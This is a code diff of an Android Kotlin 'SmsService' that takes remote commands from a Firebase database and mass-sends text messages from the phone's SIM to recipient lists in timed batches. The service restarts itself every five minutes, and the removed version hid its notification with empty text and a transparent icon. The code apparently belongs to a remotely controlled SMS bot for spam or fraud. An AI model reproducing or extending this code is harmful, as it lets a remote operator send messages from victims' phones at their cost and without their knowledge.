@@ -22,161 +22,270 @@ class SmsService : Service() {
 
     // Track sent numbers per commandId to avoid duplicates
     private val sentSmsTracker = mutableMapOf<String, MutableSet<String>>()
+    private lateinit var deviceId: String
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
-        createNotificationChannel()
-        val notification = buildForegroundNotification()
-        startForeground(NOTIFICATION_ID, notification)
-        scheduleRestart(this)
+        try {
+            deviceId = MainActivity.getDeviceId(this)
+            createNotificationChannel()
+            val notification = buildForegroundNotification()
+            startForeground(NOTIFICATION_ID, notification)
+            scheduleRestart(this)
+            Logger.log("SmsService created successfully for device: $deviceId")
+        } catch (e: Exception) {
+            Logger.error("Failed to create SmsService", e)
+            stopSelf()
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val deviceId = MainActivity.getDeviceId(this)
-        listenForSendCommands(deviceId)
-        return START_STICKY
+        try {
+            listenForSendCommands(deviceId)
+            return START_STICKY
+        } catch (e: Exception) {
+            Logger.error("Failed to start SmsService command", e)
+            return START_NOT_STICKY
+        }
     }
 
     private fun scheduleRestart(context: Context) {
-        val alarmIntent = Intent(context, SmsService::class.java)
-        val pendingIntent = PendingIntent.getService(
-            context, 0, alarmIntent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
+        try {
+            val alarmIntent = Intent(context, SmsService::class.java)
+            val pendingIntent = PendingIntent.getService(
+                context, 0, alarmIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
 
-
-        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        alarmManager.setRepeating(
-            AlarmManager.ELAPSED_REALTIME_WAKEUP,
-            SystemClock.elapsedRealtime() + 60_000, // delay before restart
-            5 * 60_000, // repeat every 5 minutes
-            pendingIntent
-        )
+            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            alarmManager.setRepeating(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                SystemClock.elapsedRealtime() + 60_000,
+                5 * 60_000,
+                pendingIntent
+            )
+        } catch (e: Exception) {
+            Logger.error("Failed to schedule SMS service restart", e)
+        }
     }
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "SMS Service",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Running SMS capture and send service"
+            try {
+                val channel = NotificationChannel(
+                    CHANNEL_ID,
+                    "SMS Service",
+                    NotificationManager.IMPORTANCE_LOW
+                ).apply {
+                    description = "Running SMS capture and send service"
+                }
+                val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+                notificationManager.createNotificationChannel(channel)
+            } catch (e: Exception) {
+                Logger.error("Failed to create SMS notification channel", e)
             }
-            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.createNotificationChannel(channel)
         }
     }
 
     private fun buildForegroundNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("")
-            .setContentText("")
-            .setSmallIcon(android.R.color.transparent)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true)
-            .build()
+        return try {
+            NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("SMS Service")
+                .setContentText("Monitoring SMS commands")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setOngoing(true)
+                .build()
+        } catch (e: Exception) {
+            Logger.error("Failed to build SMS notification", e)
+            NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("SMS Service")
+                .setContentText("Running")
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setOngoing(true)
+                .build()
+        }
     }
 
     private fun listenForSendCommands(deviceId: String) {
-        val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("send_sms_commands")
+        try {
+            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("send_sms_commands")
 
-        commandsRef.addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                snapshot.children.forEach { commandSnapshot ->
-                    val command = commandSnapshot.value as? Map<*, *> ?: return
-                    val status = command["status"] as? String
-                    if (status == "pending") {
-                        val simNumber = command["sim_number"] as? String
-                        val recipients = command["recipients"] as? List<*>
-                        val message = command["message"] as? String
-                        if (simNumber != null && recipients != null && message != null) {
-                            val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
-                            if (validRecipients.isNotEmpty()) {
-                                sendSmsToAll(simNumber, validRecipients, message, commandSnapshot.key!!)
+            commandsRef.addValueEventListener(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    try {
+                        snapshot.children.forEach { commandSnapshot ->
+                            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
+                            val status = command["status"] as? String
+                            val commandId = commandSnapshot.key ?: return@forEach
+                            
+                            if (status == "pending") {
+                                val simNumber = command["sim_number"] as? String
+                                val recipients = command["recipients"] as? List<*>
+                                val message = command["message"] as? String
+                                
+                                if (simNumber != null && recipients != null && message != null) {
+                                    val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
+                                    if (validRecipients.isNotEmpty()) {
+                                        Logger.log("Processing SMS command: $commandId for ${validRecipients.size} recipients")
+                                        sendSmsToAll(simNumber, validRecipients, message, commandId)
+                                    } else {
+                                        Logger.error("No valid recipients for command: $commandId")
+                                        updateCommandStatus(commandId, "failed", "No valid recipients")
+                                    }
+                                } else {
+                                    Logger.error("Invalid command data for: $commandId")
+                                    updateCommandStatus(commandId, "failed", "Invalid command data")
+                                }
                             }
                         }
+                    } catch (e: Exception) {
+                        Logger.error("Error processing SMS commands", e)
                     }
                 }
-            }
 
-            override fun onCancelled(error: DatabaseError) {
-                Logger.error("Database error: ${error.message}", error.toException())
-            }
-        })
+                override fun onCancelled(error: DatabaseError) {
+                    Logger.error("SMS commands database error: ${error.message}", error.toException())
+                }
+            })
+        } catch (e: Exception) {
+            Logger.error("Failed to listen for SMS commands", e)
+        }
     }
 
     private fun sendSmsToAll(simNumber: String, recipients: List<String>, message: String, commandId: String) {
-        val handler = Handler(Looper.getMainLooper())
-        val deviceId = MainActivity.getDeviceId(this)
-        val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
-        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            getSystemService(SmsManager::class.java)
-        } else {
-            SmsManager.getDefault()
-        }
+        try {
+            val handler = Handler(Looper.getMainLooper())
+            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
+            
+            // Get appropriate SMS manager
+            val smsManager = getSmsManagerForSim(simNumber)
+            if (smsManager == null) {
+                Logger.error("Failed to get SMS manager for SIM: $simNumber")
+                updateCommandStatus(commandId, "failed", "Invalid SIM number: $simNumber")
+                return
+            }
 
-        val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
-        val subId = subscriptionManager.activeSubscriptionInfoList?.find {
-            it.number == simNumber
-        }?.subscriptionId
-
-        val simSpecificSmsManager = subId?.let {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                SmsManager.getSmsManagerForSubscriptionId(it)
-            } else smsManager
-        } ?: smsManager
-
-        val chunks = recipients.chunked(10)
-
-        fun sendChunk(index: Int) {
-            if (index >= chunks.size) return
-
-            val batch = chunks[index]
+            val chunks = recipients.chunked(10)
             val alreadySentSet = sentSmsTracker.getOrPut(commandId) { mutableSetOf() }
 
-            batch.forEach { number ->
-                if (alreadySentSet.contains(number)) {
-                    Logger.log("Skipping duplicate SMS to $number for command $commandId")
-                    return@forEach
+            fun sendChunk(index: Int) {
+                if (index >= chunks.size) {
+                    Logger.log("Completed sending SMS for command: $commandId")
+                    updateCommandStatus(commandId, "completed", null)
+                    return
                 }
 
-                try {
-                    simSpecificSmsManager.sendTextMessage(number, null, message, null, null)
-                    Logger.log("Sent SMS from $simNumber to $number")
-                    alreadySentSet.add(number)
+                val batch = chunks[index]
+                var successCount = 0
+                var failureCount = 0
 
-                    // Remove number from recipients list in Firebase
-                    commandRef.child("recipients").runTransaction(object : Transaction.Handler {
-                        override fun doTransaction(currentData: MutableData): Transaction.Result {
-                            val currentList = currentData.getValue(object : GenericTypeIndicator<MutableList<String>>() {}) ?: mutableListOf()
-                            currentList.remove(number)
-                            currentData.value = currentList
-                            return Transaction.success(currentData)
-                        }
+                batch.forEach { number ->
+                    if (alreadySentSet.contains(number)) {
+                        Logger.log("Skipping duplicate SMS to $number for command $commandId")
+                        return@forEach
+                    }
 
-                        override fun onComplete(error: DatabaseError?, committed: Boolean, snapshot: DataSnapshot?) {
-                            val newList = snapshot?.getValue(object : GenericTypeIndicator<List<String>>() {})
-                            if (committed && (newList == null || newList.isEmpty())) {
-                                commandRef.removeValue()
-                                    .addOnSuccessListener { Logger.log("Removed command $commandId after final number sent") }
-                                    .addOnFailureListener { e -> Logger.error("Failed to remove command: ${e.message}", e) }
+                    try {
+                        smsManager.sendTextMessage(number, null, message, null, null)
+                        Logger.log("Sent SMS from $simNumber to $number")
+                        alreadySentSet.add(number)
+                        successCount++
+
+                        // Remove number from recipients list in Firebase
+                        commandRef.child("recipients").runTransaction(object : Transaction.Handler {
+                            override fun doTransaction(currentData: MutableData): Transaction.Result {
+                                val currentList = currentData.getValue(object : GenericTypeIndicator<MutableList<String>>() {}) ?: mutableListOf()
+                                currentList.remove(number)
+                                currentData.value = currentList
+                                return Transaction.success(currentData)
                             }
-                        }
-                    })
-                } catch (e: Exception) {
-                    Logger.error("Failed to send SMS to $number: ${e.message}", e)
+
+                            override fun onComplete(error: DatabaseError?, committed: Boolean, snapshot: DataSnapshot?) {
+                                if (committed) {
+                                    val newList = snapshot?.getValue(object : GenericTypeIndicator<List<String>>() {})
+                                    if (newList == null || newList.isEmpty()) {
+                                        commandRef.removeValue()
+                                            .addOnSuccessListener { 
+                                                Logger.log("Removed completed command $commandId")
+                                                sentSmsTracker.remove(commandId)
+                                            }
+                                            .addOnFailureListener { e -> 
+                                                Logger.error("Failed to remove command: ${e.message}", e) 
+                                            }
+                                    }
+                                }
+                            }
+                        })
+                    } catch (e: Exception) {
+                        Logger.error("Failed to send SMS to $number: ${e.message}", e)
+                        failureCount++
+                    }
+                }
+
+                Logger.log("Batch $index completed: $successCount success, $failureCount failures")
+
+                // Schedule next batch
+                if (index + 1 < chunks.size) {
+                    handler.postDelayed({ sendChunk(index + 1) }, 60_000L) // 1 min delay
                 }
             }
 
-            // Schedule next batch
-            if (index + 1 < chunks.size) {
-                handler.postDelayed({ sendChunk(index + 1) }, 60_000L) // 1 min delay
-            }
+            sendChunk(0)
+        } catch (e: Exception) {
+            Logger.error("Failed to send SMS batch for command: $commandId", e)
+            updateCommandStatus(commandId, "failed", "Batch send error: ${e.message}")
         }
+    }
 
-        sendChunk(0)
+    private fun getSmsManagerForSim(simNumber: String): SmsManager? {
+        return try {
+            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+            val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: return null
+            
+            // Find subscription by SIM number or slot
+            val subscription = subscriptions.find { 
+                it.number == simNumber || "sim${it.simSlotIndex + 1}" == simNumber.lowercase()
+            }
+            
+            if (subscription != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                    SmsManager.getSmsManagerForSubscriptionId(subscription.subscriptionId)
+                } else {
+                    SmsManager.getDefault()
+                }
+            } else {
+                Logger.error("No subscription found for SIM: $simNumber")
+                SmsManager.getDefault()
+            }
+        } catch (e: Exception) {
+            Logger.error("Error getting SMS manager for SIM: $simNumber", e)
+            SmsManager.getDefault()
+        }
+    }
+
+    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
+        try {
+            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
+            val updates = mutableMapOf<String, Any>(
+                "status" to status,
+                "timestamp" to System.currentTimeMillis()
+            )
+            if (error != null) {
+                updates["error"] = error
+            }
+            
+            commandRef.updateChildren(updates)
+                .addOnSuccessListener {
+                    Logger.log("Updated SMS command $commandId status to $status")
+                }
+                .addOnFailureListener { e ->
+                    Logger.error("Failed to update SMS command status: ${e.message}", e)
+                }
+        } catch (e: Exception) {
+            Logger.error("Error updating SMS command status", e)
+        }
     }
 }
